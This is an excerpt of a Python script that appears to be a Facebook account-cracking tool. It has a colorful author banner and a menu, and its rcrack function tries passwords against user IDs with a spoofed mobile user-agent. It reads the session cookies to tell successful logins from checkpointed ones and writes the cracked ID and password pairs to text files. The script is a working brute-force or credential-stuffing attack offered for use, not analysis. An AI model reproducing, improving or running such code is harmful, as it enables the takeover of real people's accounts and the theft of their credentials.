...
\033[1;33m----------------------------------------------
 \033[1;37mAUTHOR    : \033[1;36mSAJID-X-ZIDI-LADKI
 \033[1;35mGITHUB    : \033[1;35mSAJID
 \033[1;39mFACEBOOK  : \033[1;33mSAJID KING
...
\033[1;35mpata chala ke ghalat leke
\033[1;38mmain bata nikla 🙈
\033[1;33m----------------------------------------------""")
...
def riaz():
	...
	if king1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100022543239409&mibextid=ZbWKwL');riaz()
	if king1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5,'
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SAJID-X-zidi-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SAJID-X-zidi-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SAJID-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SAJID-X-zidi-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mSAJID\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
